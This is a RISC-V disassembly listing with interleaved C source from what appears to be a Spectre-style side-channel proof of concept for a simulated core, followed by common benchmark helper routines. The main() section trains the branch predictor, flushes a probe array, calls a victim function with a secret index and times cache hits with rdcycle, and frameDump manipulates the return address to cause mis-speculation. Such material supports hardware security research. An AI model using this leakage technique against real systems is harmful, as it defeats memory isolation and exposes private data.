    8000132e:	00001797          	auipc	a5,0x1
    80001332:	5fe78793          	addi	a5,a5,1534 # 8000292c <secret>
    80001336:	c398                	sw	a4,0(a5)
        

            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
    80001338:	02000793          	li	a5,32
    8000133c:	fcf43c23          	sd	a5,-40(s0)
    80001340:	a8f9                	j	8000141e <main+0x15c>
                 flushCache((uint64_t)array2, sizeof(array2));
    80001342:	00015797          	auipc	a5,0x15
    80001346:	67e78793          	addi	a5,a5,1662 # 800169c0 <array2>
    8000134a:	6591                	lui	a1,0x4
    8000134c:	853e                	mv	a0,a5
    8000134e:	cfbff0ef          	jal	ra,80001048 <flushCache>
                // bit twiddling to set passInIdx=randIdx or to attackIdx after TRAIN_TIMES iterations
                // avoid jumps in case those tip off the branch predictor
                // note: randIdx changes everytime the atkRound changes so that the tally does not get affected
                //       training creates a false hit in array2 for that array1 value (you want this to be ignored by having it changed)
                randIdx = 3;
    80001352:	478d                	li	a5,3
    80001354:	f8f43c23          	sd	a5,-104(s0)
                randsecret=0;
    80001358:	f8043823          	sd	zero,-112(s0)
                passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
    8000135c:	fd843703          	ld	a4,-40(s0)
    80001360:	02100793          	li	a5,33
    80001364:	02f767b3          	rem	a5,a4,a5
    80001368:	17fd                	addi	a5,a5,-1
    8000136a:	873e                	mv	a4,a5
    8000136c:	77c1                	lui	a5,0xffff0
    8000136e:	8ff9                	and	a5,a5,a4
    80001370:	f8f43423          	sd	a5,-120(s0)
                passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
    80001374:	f8843783          	ld	a5,-120(s0)
    80001378:	83c1                	srli	a5,a5,0x10
    8000137a:	f8843703          	ld	a4,-120(s0)
    8000137e:	8fd9                	or	a5,a5,a4
    80001380:	f8f43423          	sd	a5,-120(s0)
                secretIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; 
    80001384:	fd843703          	ld	a4,-40(s0)
    80001388:	02100793          	li	a5,33
    8000138c:	02f767b3          	rem	a5,a4,a5
    80001390:	17fd                	addi	a5,a5,-1
    80001392:	873e                	mv	a4,a5
    80001394:	77c1                	lui	a5,0xffff0
    80001396:	8ff9                	and	a5,a5,a4
    80001398:	f8f43023          	sd	a5,-128(s0)
                secretIdx = (secretIdx | (secretIdx >> 16)); 
    8000139c:	f8043783          	ld	a5,-128(s0)
    800013a0:	83c1                	srli	a5,a5,0x10
    800013a2:	f8043703          	ld	a4,-128(s0)
    800013a6:	8fd9                	or	a5,a5,a4
    800013a8:	f8f43023          	sd	a5,-128(s0)
                passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx 
    800013ac:	fc843703          	ld	a4,-56(s0)
    800013b0:	f9843783          	ld	a5,-104(s0)
    800013b4:	8f3d                	xor	a4,a4,a5
    800013b6:	f8843783          	ld	a5,-120(s0)
    800013ba:	8ff9                	and	a5,a5,a4
    800013bc:	f9843703          	ld	a4,-104(s0)
    800013c0:	8fb9                	xor	a5,a5,a4
    800013c2:	f8f43423          	sd	a5,-120(s0)
                secretIdx = randsecret ^ (secretIdx & (secret ^ randsecret));
    800013c6:	00001797          	auipc	a5,0x1
    800013ca:	56678793          	addi	a5,a5,1382 # 8000292c <secret>
    800013ce:	439c                	lw	a5,0(a5)
    800013d0:	873e                	mv	a4,a5
    800013d2:	f9043783          	ld	a5,-112(s0)
    800013d6:	8f3d                	xor	a4,a4,a5
    800013d8:	f8043783          	ld	a5,-128(s0)
    800013dc:	8ff9                	and	a5,a5,a4
    800013de:	f9043703          	ld	a4,-112(s0)
    800013e2:	8fb9                	xor	a5,a5,a4
    800013e4:	f8f43023          	sd	a5,-128(s0)
                asm("fence rw, rw\n");
    800013e8:	0330000f          	fence	rw,rw
                // set of constant takens to make the BHR be in a all not taken state
                for(uint64_t k = 0; k < 100; ++k){
    800013ec:	fc043823          	sd	zero,-48(s0)
    800013f0:	a031                	j	800013fc <main+0x13a>
    800013f2:	fd043783          	ld	a5,-48(s0)
    800013f6:	0785                	addi	a5,a5,1
    800013f8:	fcf43823          	sd	a5,-48(s0)
    800013fc:	fd043703          	ld	a4,-48(s0)
    80001400:	06300793          	li	a5,99
    80001404:	fee7f7e3          	bleu	a4,a5,800013f2 <main+0x130>
                    asm("");
                }
                

                // call function to train or attack
                victimFunc(passInIdx,secretIdx);
    80001408:	f8043583          	ld	a1,-128(s0)
    8000140c:	f8843503          	ld	a0,-120(s0)
    80001410:	df3ff0ef          	jal	ra,80001202 <victimFunc>
            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
    80001414:	fd843783          	ld	a5,-40(s0)
    80001418:	17fd                	addi	a5,a5,-1
    8000141a:	fcf43c23          	sd	a5,-40(s0)
    8000141e:	fd843783          	ld	a5,-40(s0)
    80001422:	f207d0e3          	bgez	a5,80001342 <main+0x80>
            }


          
                uint64_t  uiTemp = 0;  //introduced a dummy variable to prevent compiler optimizations
    80001426:	fc043023          	sd	zero,-64(s0)
                start = rdcycle();
    8000142a:	c00027f3          	rdcycle	a5
    8000142e:	faf43c23          	sd	a5,-72(s0)
    80001432:	fb843783          	ld	a5,-72(s0)
    80001436:	faf43823          	sd	a5,-80(s0)
                dummy &= array2[40* L1_BLOCK_SZ_BYTES];
    8000143a:	00015717          	auipc	a4,0x15
    8000143e:	58670713          	addi	a4,a4,1414 # 800169c0 <array2>
    80001442:	6785                	lui	a5,0x1
    80001444:	97ba                	add	a5,a5,a4
    80001446:	a007c703          	lbu	a4,-1536(a5) # a00 <_tbss_end+0x97c>
    8000144a:	fef44783          	lbu	a5,-17(s0)
    8000144e:	8ff9                	and	a5,a5,a4
    80001450:	fef407a3          	sb	a5,-17(s0)
                diff = (rdcycle() - start);
    80001454:	c00027f3          	rdcycle	a5
    80001458:	faf43423          	sd	a5,-88(s0)
    8000145c:	fa843703          	ld	a4,-88(s0)
    80001460:	fb043783          	ld	a5,-80(s0)
    80001464:	40f707b3          	sub	a5,a4,a5
    80001468:	faf43023          	sd	a5,-96(s0)
                 printf("%d,%d\n",secret,diff);
    8000146c:	00001797          	auipc	a5,0x1
    80001470:	4c078793          	addi	a5,a5,1216 # 8000292c <secret>
    80001474:	439c                	lw	a5,0(a5)
    80001476:	fa043603          	ld	a2,-96(s0)
    8000147a:	85be                	mv	a1,a5
    8000147c:	00001517          	auipc	a0,0x1
    80001480:	24450513          	addi	a0,a0,580 # 800026c0 <atol+0xdc>
    80001484:	54f000ef          	jal	ra,800021d2 <printf>
    for(int len = 7; len >= 0; --len){
    80001488:	fe842783          	lw	a5,-24(s0)
    8000148c:	37fd                	addiw	a5,a5,-1
    8000148e:	fef42423          	sw	a5,-24(s0)
    80001492:	fe842783          	lw	a5,-24(s0)
    80001496:	2781                	sext.w	a5,a5
    80001498:	e407d3e3          	bgez	a5,800012de <main+0x1c>

    }
    return 0;
    8000149c:	4781                	li	a5,0
}
    8000149e:	853e                	mv	a0,a5
    800014a0:	70e6                	ld	ra,120(sp)
    800014a2:	7446                	ld	s0,112(sp)
    800014a4:	6109                	addi	sp,sp,128
    800014a6:	8082                	ret

00000000800014a8 <frameDump>:
.section .text
.globl frameDump

frameDump:
    # Pop off stack frame and get RA
    ld ra, 56(sp)
    800014a8:	70e2                	ld	ra,56(sp)
    addi sp, sp, 64
    800014aa:	6121                	addi	sp,sp,64

    # Calculate ra - 2 + (( 2 << 4 ) / 16)
    # This stalls the result of ra to be used for the ret
    addi ra, ra, -2
    800014ac:	10f9                	addi	ra,ra,-2
    addi t1, zero, 2
    800014ae:	00200313          	li	t1,2
    slli t2, t1, 0x4
    800014b2:	00431393          	slli	t2,t1,0x4
    fcvt.s.lu fa4, t1 
    800014b6:	d0337753          	fcvt.s.lu	fa4,t1
    fcvt.s.lu fa5, t2 
    800014ba:	d033f7d3          	fcvt.s.lu	fa5,t2
    fdiv.s fa5, fa5, fa4
    800014be:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    fdiv.s fa5, fa5, fa4
    800014c2:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    fdiv.s fa5, fa5, fa4
    800014c6:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    fdiv.s fa5, fa5, fa4
    800014ca:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    fcvt.lu.s t2, fa5, rtz
    800014ce:	c03793d3          	fcvt.lu.s	t2,fa5,rtz
    add ra, ra, t2
    800014d2:	909e                	add	ra,ra,t2

    # Return to main
    ret
    800014d4:	8082                	ret

00000000800014d6 <printArray>:
#include <stdint.h>

#define static_assert(cond) switch(0) { case 0: case !!(long)(cond): ; }

static void printArray(const char name[], int n, const int arr[])
{
    800014d6:	7179                	addi	sp,sp,-48
    800014d8:	f422                	sd	s0,40(sp)
    800014da:	1800                	addi	s0,sp,48
    800014dc:	fea43423          	sd	a0,-24(s0)
    800014e0:	87ae                	mv	a5,a1
    800014e2:	fcc43c23          	sd	a2,-40(s0)
    800014e6:	fef42223          	sw	a5,-28(s0)
  printf( " %10s :", name );
  for ( i = 0; i < n; i++ )
    printf( " %3d ", arr[i] );
  printf( "\n" );
#endif
}
    800014ea:	0001                	nop
    800014ec:	7422                	ld	s0,40(sp)
    800014ee:	6145                	addi	sp,sp,48
    800014f0:	8082                	ret

00000000800014f2 <printDoubleArray>:

static void printDoubleArray(const char name[], int n, const double arr[])
{
    800014f2:	7179                	addi	sp,sp,-48
    800014f4:	f422                	sd	s0,40(sp)
    800014f6:	1800                	addi	s0,sp,48
    800014f8:	fea43423          	sd	a0,-24(s0)
    800014fc:	87ae                	mv	a5,a1
    800014fe:	fcc43c23          	sd	a2,-40(s0)
    80001502:	fef42223          	sw	a5,-28(s0)
  printf( " %10s :", name );
  for ( i = 0; i < n; i++ )
    printf( " %g ", arr[i] );
  printf( "\n" );
#endif
}
    80001506:	0001                	nop
    80001508:	7422                	ld	s0,40(sp)
    8000150a:	6145                	addi	sp,sp,48
    8000150c:	8082                	ret

000000008000150e <verify>:

static int verify(int n, const volatile int* test, const int* verify)
{
    8000150e:	715d                	addi	sp,sp,-80
    80001510:	e4a2                	sd	s0,72(sp)
    80001512:	0880                	addi	s0,sp,80
    80001514:	87aa                	mv	a5,a0
    80001516:	fcb43023          	sd	a1,-64(s0)
    8000151a:	fac43c23          	sd	a2,-72(s0)
    8000151e:	fcf42623          	sw	a5,-52(s0)
  int i;
  // Unrolled for faster verification
  for (i = 0; i < n/2*2; i+=2)
    80001522:	fe042623          	sw	zero,-20(s0)
    80001526:	a071                	j	800015b2 <verify+0xa4>
  {
    int t0 = test[i], t1 = test[i+1];
    80001528:	fec42783          	lw	a5,-20(s0)
    8000152c:	078a                	slli	a5,a5,0x2
    8000152e:	fc043703          	ld	a4,-64(s0)
    80001532:	97ba                	add	a5,a5,a4
    80001534:	439c                	lw	a5,0(a5)
    80001536:	fef42423          	sw	a5,-24(s0)
    8000153a:	fec42783          	lw	a5,-20(s0)
    8000153e:	0785                	addi	a5,a5,1
    80001540:	078a                	slli	a5,a5,0x2
    80001542:	fc043703          	ld	a4,-64(s0)
    80001546:	97ba                	add	a5,a5,a4
    80001548:	439c                	lw	a5,0(a5)
    8000154a:	fef42223          	sw	a5,-28(s0)
    int v0 = verify[i], v1 = verify[i+1];
    8000154e:	fec42783          	lw	a5,-20(s0)
    80001552:	078a                	slli	a5,a5,0x2
    80001554:	fb843703          	ld	a4,-72(s0)
    80001558:	97ba                	add	a5,a5,a4
    8000155a:	439c                	lw	a5,0(a5)
    8000155c:	fef42023          	sw	a5,-32(s0)
    80001560:	fec42783          	lw	a5,-20(s0)
    80001564:	0785                	addi	a5,a5,1
    80001566:	078a                	slli	a5,a5,0x2
    80001568:	fb843703          	ld	a4,-72(s0)
    8000156c:	97ba                	add	a5,a5,a4
    8000156e:	439c                	lw	a5,0(a5)
    80001570:	fcf42e23          	sw	a5,-36(s0)
    if (t0 != v0) return i+1;
    80001574:	fe842703          	lw	a4,-24(s0)
    80001578:	fe042783          	lw	a5,-32(s0)
    8000157c:	2701                	sext.w	a4,a4
    8000157e:	2781                	sext.w	a5,a5
    80001580:	00f70763          	beq	a4,a5,8000158e <verify+0x80>
    80001584:	fec42783          	lw	a5,-20(s0)
    80001588:	2785                	addiw	a5,a5,1
    8000158a:	2781                	sext.w	a5,a5
    8000158c:	a051                	j	80001610 <verify+0x102>
    if (t1 != v1) return i+2;
    8000158e:	fe442703          	lw	a4,-28(s0)
    80001592:	fdc42783          	lw	a5,-36(s0)
    80001596:	2701                	sext.w	a4,a4
    80001598:	2781                	sext.w	a5,a5
    8000159a:	00f70763          	beq	a4,a5,800015a8 <verify+0x9a>
    8000159e:	fec42783          	lw	a5,-20(s0)
    800015a2:	2789                	addiw	a5,a5,2
    800015a4:	2781                	sext.w	a5,a5
    800015a6:	a0ad                	j	80001610 <verify+0x102>
  for (i = 0; i < n/2*2; i+=2)
    800015a8:	fec42783          	lw	a5,-20(s0)
    800015ac:	2789                	addiw	a5,a5,2
    800015ae:	fef42623          	sw	a5,-20(s0)
    800015b2:	fcc42783          	lw	a5,-52(s0)
    800015b6:	01f7d71b          	srliw	a4,a5,0x1f
    800015ba:	9fb9                	addw	a5,a5,a4
    800015bc:	4017d79b          	sraiw	a5,a5,0x1
    800015c0:	2781                	sext.w	a5,a5
    800015c2:	0017979b          	slliw	a5,a5,0x1
    800015c6:	0007871b          	sext.w	a4,a5
    800015ca:	fec42783          	lw	a5,-20(s0)
    800015ce:	2781                	sext.w	a5,a5
    800015d0:	f4e7cce3          	blt	a5,a4,80001528 <verify+0x1a>
  }
  if (n % 2 != 0 && test[n-1] != verify[n-1])
    800015d4:	fcc42783          	lw	a5,-52(s0)
    800015d8:	8b85                	andi	a5,a5,1
    800015da:	2781                	sext.w	a5,a5
    800015dc:	cb8d                	beqz	a5,8000160e <verify+0x100>
    800015de:	fcc42783          	lw	a5,-52(s0)
    800015e2:	078a                	slli	a5,a5,0x2
    800015e4:	17f1                	addi	a5,a5,-4
    800015e6:	fc043703          	ld	a4,-64(s0)
    800015ea:	97ba                	add	a5,a5,a4
    800015ec:	439c                	lw	a5,0(a5)
    800015ee:	0007869b          	sext.w	a3,a5
    800015f2:	fcc42783          	lw	a5,-52(s0)
    800015f6:	078a                	slli	a5,a5,0x2
    800015f8:	17f1                	addi	a5,a5,-4
    800015fa:	fb843703          	ld	a4,-72(s0)
    800015fe:	97ba                	add	a5,a5,a4
    80001600:	439c                	lw	a5,0(a5)
    80001602:	8736                	mv	a4,a3
    80001604:	00f70563          	beq	a4,a5,8000160e <verify+0x100>
    return n;
    80001608:	fcc42783          	lw	a5,-52(s0)
    8000160c:	a011                	j	80001610 <verify+0x102>
  return 0;
    8000160e:	4781                	li	a5,0
}
    80001610:	853e                	mv	a0,a5
    80001612:	6426                	ld	s0,72(sp)
    80001614:	6161                	addi	sp,sp,80
    80001616:	8082                	ret

0000000080001618 <verifyDouble>:

static int verifyDouble(int n, const volatile double* test, const double* verify)
{
    80001618:	711d                	addi	sp,sp,-96
    8000161a:	eca2                	sd	s0,88(sp)
    8000161c:	1080                	addi	s0,sp,96
    8000161e:	87aa                	mv	a5,a0
    80001620:	fab43823          	sd	a1,-80(s0)
    80001624:	fac43423          	sd	a2,-88(s0)
    80001628:	faf42e23          	sw	a5,-68(s0)
  int i;
  // Unrolled for faster verification
  for (i = 0; i < n/2*2; i+=2)
    8000162c:	fe042623          	sw	zero,-20(s0)
    80001630:	a065                	j	800016d8 <verifyDouble+0xc0>
  {
    double t0 = test[i], t1 = test[i+1];
    80001632:	fec42783          	lw	a5,-20(s0)
    80001636:	078e                	slli	a5,a5,0x3
    80001638:	fb043703          	ld	a4,-80(s0)
    8000163c:	97ba                	add	a5,a5,a4
    8000163e:	239c                	fld	fa5,0(a5)
    80001640:	fef43027          	fsd	fa5,-32(s0)
    80001644:	fec42783          	lw	a5,-20(s0)
    80001648:	0785                	addi	a5,a5,1
    8000164a:	078e                	slli	a5,a5,0x3
    8000164c:	fb043703          	ld	a4,-80(s0)
    80001650:	97ba                	add	a5,a5,a4
    80001652:	239c                	fld	fa5,0(a5)
    80001654:	fcf43c27          	fsd	fa5,-40(s0)
    double v0 = verify[i], v1 = verify[i+1];
    80001658:	fec42783          	lw	a5,-20(s0)
    8000165c:	078e                	slli	a5,a5,0x3
    8000165e:	fa843703          	ld	a4,-88(s0)
    80001662:	97ba                	add	a5,a5,a4
    80001664:	239c                	fld	fa5,0(a5)
    80001666:	fcf43827          	fsd	fa5,-48(s0)
    8000166a:	fec42783          	lw	a5,-20(s0)
    8000166e:	0785                	addi	a5,a5,1
    80001670:	078e                	slli	a5,a5,0x3
    80001672:	fa843703          	ld	a4,-88(s0)
    80001676:	97ba                	add	a5,a5,a4
    80001678:	239c                	fld	fa5,0(a5)
    8000167a:	fcf43427          	fsd	fa5,-56(s0)
    int eq1 = t0 == v0, eq2 = t1 == v1;
    8000167e:	fe043707          	fld	fa4,-32(s0)
    80001682:	fd043787          	fld	fa5,-48(s0)
    80001686:	a2f727d3          	feq.d	a5,fa4,fa5
    8000168a:	00f037b3          	snez	a5,a5
    8000168e:	0ff7f793          	andi	a5,a5,255
    80001692:	fcf42223          	sw	a5,-60(s0)
    80001696:	fd843707          	fld	fa4,-40(s0)
    8000169a:	fc843787          	fld	fa5,-56(s0)
    8000169e:	a2f727d3          	feq.d	a5,fa4,fa5
    800016a2:	00f037b3          	snez	a5,a5
    800016a6:	0ff7f793          	andi	a5,a5,255
    800016aa:	fcf42023          	sw	a5,-64(s0)
    if (!(eq1 & eq2)) return i+1+eq1;
    800016ae:	fc442703          	lw	a4,-60(s0)
    800016b2:	fc042783          	lw	a5,-64(s0)
    800016b6:	8ff9                	and	a5,a5,a4
    800016b8:	2781                	sext.w	a5,a5
    800016ba:	eb91                	bnez	a5,800016ce <verifyDouble+0xb6>
    800016bc:	fec42783          	lw	a5,-20(s0)
    800016c0:	2785                	addiw	a5,a5,1
    800016c2:	2781                	sext.w	a5,a5
    800016c4:	fc442703          	lw	a4,-60(s0)
    800016c8:	9fb9                	addw	a5,a5,a4
    800016ca:	2781                	sext.w	a5,a5
    800016cc:	a09d                	j	80001732 <verifyDouble+0x11a>
  for (i = 0; i < n/2*2; i+=2)
    800016ce:	fec42783          	lw	a5,-20(s0)
    800016d2:	2789                	addiw	a5,a5,2
    800016d4:	fef42623          	sw	a5,-20(s0)
    800016d8:	fbc42783          	lw	a5,-68(s0)
    800016dc:	01f7d71b          	srliw	a4,a5,0x1f
    800016e0:	9fb9                	addw	a5,a5,a4
    800016e2:	4017d79b          	sraiw	a5,a5,0x1
    800016e6:	2781                	sext.w	a5,a5
    800016e8:	0017979b          	slliw	a5,a5,0x1
    800016ec:	0007871b          	sext.w	a4,a5
    800016f0:	fec42783          	lw	a5,-20(s0)
    800016f4:	2781                	sext.w	a5,a5
    800016f6:	f2e7cee3          	blt	a5,a4,80001632 <verifyDouble+0x1a>
  }
  if (n % 2 != 0 && test[n-1] != verify[n-1])
    800016fa:	fbc42783          	lw	a5,-68(s0)
    800016fe:	8b85                	andi	a5,a5,1
    80001700:	2781                	sext.w	a5,a5
    80001702:	c79d                	beqz	a5,80001730 <verifyDouble+0x118>
    80001704:	fbc42783          	lw	a5,-68(s0)
    80001708:	078e                	slli	a5,a5,0x3
    8000170a:	17e1                	addi	a5,a5,-8
    8000170c:	fb043703          	ld	a4,-80(s0)
    80001710:	97ba                	add	a5,a5,a4
    80001712:	2398                	fld	fa4,0(a5)
    80001714:	fbc42783          	lw	a5,-68(s0)
    80001718:	078e                	slli	a5,a5,0x3
    8000171a:	17e1                	addi	a5,a5,-8
    8000171c:	fa843703          	ld	a4,-88(s0)
    80001720:	97ba                	add	a5,a5,a4
    80001722:	239c                	fld	fa5,0(a5)
    80001724:	a2f727d3          	feq.d	a5,fa4,fa5
    80001728:	e781                	bnez	a5,80001730 <verifyDouble+0x118>
    return n;
    8000172a:	fbc42783          	lw	a5,-68(s0)
    8000172e:	a011                	j	80001732 <verifyDouble+0x11a>
  return 0;
    80001730:	4781                	li	a5,0
}
    80001732:	853e                	mv	a0,a5
    80001734:	6466                	ld	s0,88(sp)
    80001736:	6125                	addi	sp,sp,96
    80001738:	8082                	ret

000000008000173a <barrier>:

static void __attribute__((noinline)) barrier(int ncores)
{
    8000173a:	1101                	addi	sp,sp,-32
    8000173c:	ec22                	sd	s0,24(sp)
    8000173e:	1000                	addi	s0,sp,32
    80001740:	87aa                	mv	a5,a0
    80001742:	fef42623          	sw	a5,-20(s0)
  static volatile int sense;
  static volatile int count;
  static __thread int threadsense;

  __sync_synchronize();
    80001746:	0ff0000f          	fence

  threadsense = !threadsense;
    8000174a:	00022783          	lw	a5,0(tp) # 0 <_tdata_begin>
    8000174e:	0017b793          	seqz	a5,a5
    80001752:	0ff7f793          	andi	a5,a5,255
    80001756:	0007871b          	sext.w	a4,a5
    8000175a:	00e22023          	sw	a4,0(tp) # 0 <_tdata_begin>
  if (__sync_fetch_and_add(&count, 1) == ncores-1)
    8000175e:	0001a797          	auipc	a5,0x1a
    80001762:	a8278793          	addi	a5,a5,-1406 # 8001b1e0 <count.2754>
    80001766:	4705                	li	a4,1
    80001768:	0f50000f          	fence	iorw,ow
    8000176c:	04e7a6af          	amoadd.w.aq	a3,a4,(a5)
    80001770:	0006879b          	sext.w	a5,a3
    80001774:	0007871b          	sext.w	a4,a5
    80001778:	fec42783          	lw	a5,-20(s0)
    8000177c:	37fd                	addiw	a5,a5,-1
    8000177e:	2781                	sext.w	a5,a5
    80001780:	02f71063          	bne	a4,a5,800017a0 <barrier+0x66>
  {
    count = 0;
    80001784:	0001a797          	auipc	a5,0x1a
    80001788:	a5c78793          	addi	a5,a5,-1444 # 8001b1e0 <count.2754>
    8000178c:	0007a023          	sw	zero,0(a5)
    sense = threadsense;
    80001790:	00022703          	lw	a4,0(tp) # 0 <_tdata_begin>
    80001794:	0001a797          	auipc	a5,0x1a
    80001798:	a5078793          	addi	a5,a5,-1456 # 8001b1e4 <sense.2753>
    8000179c:	c398                	sw	a4,0(a5)
    8000179e:	a829                	j	800017b8 <barrier+0x7e>
  }
  else while(sense != threadsense)
    800017a0:	0001                	nop
    800017a2:	0001a797          	auipc	a5,0x1a
    800017a6:	a4278793          	addi	a5,a5,-1470 # 8001b1e4 <sense.2753>
    800017aa:	439c                	lw	a5,0(a5)
    800017ac:	0007871b          	sext.w	a4,a5
    800017b0:	00022783          	lw	a5,0(tp) # 0 <_tdata_begin>
    800017b4:	fef717e3          	bne	a4,a5,800017a2 <barrier+0x68>
    ;

  __sync_synchronize();
    800017b8:	0ff0000f          	fence
}
    800017bc:	0001                	nop
    800017be:	6462                	ld	s0,24(sp)
    800017c0:	6105                	addi	sp,sp,32
    800017c2:	8082                	ret

00000000800017c4 <lfsr>:

static uint64_t lfsr(uint64_t x)
{
    800017c4:	7179                	addi	sp,sp,-48
    800017c6:	f422                	sd	s0,40(sp)
    800017c8:	1800                	addi	s0,sp,48
    800017ca:	fca43c23          	sd	a0,-40(s0)
  uint64_t bit = (x ^ (x >> 1)) & 1;
    800017ce:	fd843783          	ld	a5,-40(s0)
    800017d2:	0017d713          	srli	a4,a5,0x1
    800017d6:	fd843783          	ld	a5,-40(s0)
    800017da:	8fb9                	xor	a5,a5,a4
    800017dc:	8b85                	andi	a5,a5,1
    800017de:	fef43423          	sd	a5,-24(s0)
  return (x >> 1) | (bit << 62);
    800017e2:	fd843783          	ld	a5,-40(s0)
    800017e6:	0017d713          	srli	a4,a5,0x1
    800017ea:	fe843783          	ld	a5,-24(s0)
    800017ee:	17fa                	slli	a5,a5,0x3e
    800017f0:	8fd9                	or	a5,a5,a4
}
    800017f2:	853e                	mv	a0,a5
    800017f4:	7422                	ld	s0,40(sp)
    800017f6:	6145                	addi	sp,sp,48
    800017f8:	8082                	ret

00000000800017fa <syscall>:

extern volatile uint64_t tohost;
extern volatile uint64_t fromhost;

static uintptr_t syscall(uintptr_t which, uint64_t arg0, uint64_t arg1, uint64_t arg2)
{
    800017fa:	7171                	addi	sp,sp,-176
    800017fc:	f522                	sd	s0,168(sp)
    800017fe:	1900                	addi	s0,sp,176
    80001800:	f6a43423          	sd	a0,-152(s0)
    80001804:	f6b43023          	sd	a1,-160(s0)
    80001808:	f4c43c23          	sd	a2,-168(s0)
    8000180c:	f4d43823          	sd	a3,-176(s0)
    80001810:	ff040793          	addi	a5,s0,-16
    80001814:	f8078793          	addi	a5,a5,-128
    80001818:	03f78793          	addi	a5,a5,63
    8000181c:	8399                	srli	a5,a5,0x6
    8000181e:	079a                	slli	a5,a5,0x6
  volatile uint64_t magic_mem[8] __attribute__((aligned(64)));
  magic_mem[0] = which;
    80001820:	f6843703          	ld	a4,-152(s0)
    80001824:	e398                	sd	a4,0(a5)
  magic_mem[1] = arg0;
    80001826:	f6043703          	ld	a4,-160(s0)
    8000182a:	e798                	sd	a4,8(a5)
  magic_mem[2] = arg1;
    8000182c:	f5843703          	ld	a4,-168(s0)
    80001830:	eb98                	sd	a4,16(a5)
  magic_mem[3] = arg2;
    80001832:	f5043703          	ld	a4,-176(s0)
    80001836:	ef98                	sd	a4,24(a5)
  __sync_synchronize();
    80001838:	0ff0000f          	fence

  tohost = (uintptr_t)magic_mem;
    8000183c:	86be                	mv	a3,a5
    8000183e:	fffff717          	auipc	a4,0xfffff
    80001842:	7c270713          	addi	a4,a4,1986 # 80001000 <tohost>
    80001846:	e314                	sd	a3,0(a4)
  while (fromhost == 0)
    80001848:	0001                	nop
    8000184a:	fffff717          	auipc	a4,0xfffff
    8000184e:	7f670713          	addi	a4,a4,2038 # 80001040 <fromhost>
    80001852:	6318                	ld	a4,0(a4)
    80001854:	db7d                	beqz	a4,8000184a <syscall+0x50>
    ;
  fromhost = 0;
    80001856:	fffff717          	auipc	a4,0xfffff
    8000185a:	7ea70713          	addi	a4,a4,2026 # 80001040 <fromhost>
    8000185e:	00073023          	sd	zero,0(a4)

  __sync_synchronize();
    80001862:	0ff0000f          	fence
  return magic_mem[0];
    80001866:	639c                	ld	a5,0(a5)
}
    80001868:	853e                	mv	a0,a5
    8000186a:	742a                	ld	s0,168(sp)
    8000186c:	614d                	addi	sp,sp,176
    8000186e:	8082                	ret

0000000080001870 <setStats>:
#define NUM_COUNTERS 2
static uintptr_t counters[NUM_COUNTERS];
static char* counter_names[NUM_COUNTERS];

void setStats(int enable)
{
    80001870:	715d                	addi	sp,sp,-80
    80001872:	e4a2                	sd	s0,72(sp)
    80001874:	0880                	addi	s0,sp,80
    80001876:	87aa                	mv	a5,a0
    80001878:	faf42e23          	sw	a5,-68(s0)
  int i = 0;
    8000187c:	fc042e23          	sw	zero,-36(s0)
    uintptr_t csr = read_csr(name); \
    if (!enable) { csr -= counters[i]; counter_names[i] = #name; } \
    counters[i++] = csr; \
  } while (0)

  READ_CTR(mcycle);
    80001880:	fdc42783          	lw	a5,-36(s0)
    80001884:	0007871b          	sext.w	a4,a5
    80001888:	4785                	li	a5,1
    8000188a:	fee7cbe3          	blt	a5,a4,80001880 <setStats+0x10>
    8000188e:	b00027f3          	csrr	a5,mcycle
    80001892:	fcf43823          	sd	a5,-48(s0)
    80001896:	fd043783          	ld	a5,-48(s0)
    8000189a:	fef43423          	sd	a5,-24(s0)
    8000189e:	fbc42783          	lw	a5,-68(s0)
    800018a2:	2781                	sext.w	a5,a5
    800018a4:	ef8d                	bnez	a5,800018de <setStats+0x6e>
    800018a6:	0001a717          	auipc	a4,0x1a
    800018aa:	91a70713          	addi	a4,a4,-1766 # 8001b1c0 <counters>
    800018ae:	fdc42783          	lw	a5,-36(s0)
    800018b2:	078e                	slli	a5,a5,0x3
    800018b4:	97ba                	add	a5,a5,a4
    800018b6:	639c                	ld	a5,0(a5)
    800018b8:	fe843703          	ld	a4,-24(s0)
    800018bc:	40f707b3          	sub	a5,a4,a5
    800018c0:	fef43423          	sd	a5,-24(s0)
    800018c4:	0001a717          	auipc	a4,0x1a
    800018c8:	90c70713          	addi	a4,a4,-1780 # 8001b1d0 <counter_names>
    800018cc:	fdc42783          	lw	a5,-36(s0)
    800018d0:	078e                	slli	a5,a5,0x3
    800018d2:	97ba                	add	a5,a5,a4
    800018d4:	00001717          	auipc	a4,0x1
    800018d8:	df470713          	addi	a4,a4,-524 # 800026c8 <atol+0xe4>
    800018dc:	e398                	sd	a4,0(a5)
    800018de:	fdc42783          	lw	a5,-36(s0)
    800018e2:	0017871b          	addiw	a4,a5,1
    800018e6:	fce42e23          	sw	a4,-36(s0)
    800018ea:	0001a717          	auipc	a4,0x1a
    800018ee:	8d670713          	addi	a4,a4,-1834 # 8001b1c0 <counters>
    800018f2:	078e                	slli	a5,a5,0x3
    800018f4:	97ba                	add	a5,a5,a4
    800018f6:	fe843703          	ld	a4,-24(s0)
    800018fa:	e398                	sd	a4,0(a5)
  READ_CTR(minstret);
    800018fc:	fdc42783          	lw	a5,-36(s0)
    80001900:	0007871b          	sext.w	a4,a5
    80001904:	4785                	li	a5,1
    80001906:	fee7cbe3          	blt	a5,a4,800018fc <setStats+0x8c>
    8000190a:	b02027f3          	csrr	a5,minstret
    8000190e:	fcf43423          	sd	a5,-56(s0)
    80001912:	fc843783          	ld	a5,-56(s0)
    80001916:	fef43023          	sd	a5,-32(s0)
    8000191a:	fbc42783          	lw	a5,-68(s0)
    8000191e:	2781                	sext.w	a5,a5
    80001920:	ef8d                	bnez	a5,8000195a <setStats+0xea>
    80001922:	0001a717          	auipc	a4,0x1a
